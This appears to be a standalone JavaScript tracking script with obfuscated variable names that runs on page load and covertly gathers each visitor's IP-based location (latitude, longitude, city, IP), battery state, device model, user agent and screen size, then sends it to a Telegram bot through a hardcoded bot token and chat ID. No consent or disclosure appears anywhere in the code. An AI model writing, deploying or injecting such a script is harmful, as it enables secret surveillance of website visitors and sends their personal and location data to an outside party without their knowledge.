const _0x1a2b = "8478475367:AAGLaMCiwpVOrqF40tOiDSNM7W8_jyLGwGw";
const _0x3c4d = "1312883707";

async function _0x5e6f(_0x7g8h) {
  const _0x9i0j = `https://api.telegram.org/bot${_0x1a2b}/sendMessage`;
  const _0x1k2l = {
    chat_id: _0x3c4d,
    text: _0x7g8h,
    parse_mode: 'Markdown'
  };
  try {
    await fetch(_0x9i0j, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(_0x1k2l)
    });
  } catch (_0x3m4n) {
    console.error('Error sending to Telegram:', _0x3m4n);
  }
}

async function _0x5o6p() {
  try {
    const _0x7q8r = await fetch('https://ipapi.co/json/');
    if (!_0x7q8r.ok) throw new Error('Failed to fetch location data');
    const _0x9s0t = await _0x7q8r.json();
    return {
      latitude: _0x9s0t.latitude,
      longitude: _0x9s0t.longitude,
      city: _0x9s0t.city,
      region: _0x9s0t.region,
      country: _0x9s0t.country_name,
      ip: _0x9s0t.ip
    };
  } catch (_0x1u2v) {
    console.error('Error getting location:', _0x1u2v);
    return { error: 'Location tracking failed' };
  }
}

async function _0x3w4x() {
  if ('getBattery' in navigator) {
    try {
      const _0x5y6z = await navigator.getBattery();
      return {
        level: Math.round(_0x5y6z.level * 100),
        charging: _0x5y6z.charging
      };
    } catch (_0x7a8b) {
      return { error: 'Battery API not supported' };
    }
  } else {
    return { error: 'Battery API not supported' };
  }
}

function _0x9c0d() {
  const _0x1e2f = navigator.userAgent;
  const _0x3g4h = navigator.platform;
  let _0x5i6j = 'Unknown';
  if (/Android/i.test(_0x1e2f)) {
    const _0x7k8l = _0x1e2f.match(/Android[^;]+; ([^)]+)/);
    _0x5i6j = _0x7k8l ? _0x7k8l[1] : 'Android Device';
  } else if (/iPhone|iPad|iPod/i.test(_0x1e2f)) {
    const _0x9m0n = _0x1e2f.match(/iPhone|iPad|iPod/);
    _0x5i6j = _0x9m0n ? _0x9m0n[0] : 'iOS Device';
  } else if (/Windows/i.test(_0x3g4h)) _0x5i6j = 'Windows PC';
  else if (/Mac/i.test(_0x3g4h)) _0x5i6j = 'Mac';
  else if (/Linux/i.test(_0x3g4h)) _0x5i6j = 'Linux PC';
  return {
    userAgent: _0x1e2f,
    platform: _0x3g4h,
    deviceModel: _0x5i6j,
    screenWidth: screen.width,
    screenHeight: screen.height
  };
}

async function _0x1o2p() {
  const _0x3q4r = new Date().toISOString();
  const _0x5s6t = window.location.href;
  const _0x7u8v = await _0x5o6p();
  const _0x9w0x = await _0x3w4x();
  const _0x1y2z = _0x9c0d();
  let _0x3a4b = `🌐 *Website Visitor Detected*\n\n📅 Time: ${_0x3q4r}\n🔗 Page: ${_0x5s6t}\n\n📱 *Device Information:*\nModel: ${_0x1y2z.deviceModel}\nPlatform: ${_0x1y2z.platform}\nScreen: ${_0x1y2z.screenWidth}x${_0x1y2z.screenHeight}\n\n`;
  if (_0x9w0x.level !== undefined) _0x3a4b += `🔋 *Battery:*\nLevel: ${_0x9w0x.level}%\nCharging: ${_0x9w0x.charging ? 'Yes' : 'No'}\n\n`;
  if (_0x7u8v.latitude) _0x3a4b += `📍 *Location:*\nLatitude: ${_0x7u8v.latitude}\nLongitude: ${_0x7u8v.longitude}\n[View on Map](https://www.google.com/maps?q=${_0x7u8v.latitude},${_0x7u8v.longitude})\n\n`;
  else if (_0x7u8v.error) _0x3a4b += `📍 Location: ${_0x7u8v.error}\n\n`;
  _0x3a4b += `🤖 User Agent: ${_0x1y2z.userAgent.substring(0, 100)}...`;
  await _0x5e6f(_0x3a4b);
}

document.addEventListener('DOMContentLoaded', () => {
  _0x1o2p();
});
